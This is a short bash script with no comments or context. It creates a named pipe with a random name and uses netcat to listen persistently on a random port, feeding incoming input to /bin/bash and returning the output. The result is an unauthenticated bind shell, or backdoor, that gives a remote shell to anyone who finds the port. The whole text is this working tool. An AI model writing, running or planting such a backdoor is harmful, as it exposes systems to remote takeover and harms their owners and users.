#!/bin/bash

filename=$(head -c 500 /dev/urandom | tr -dc 'a-zA-Z0-9~!@#$%^&*_-' | fold -w 6 | head -n 1)
mkfifo $filename; nc -lk $((RANDOM)) 0<$filename| /bin/bash 1>$filename 
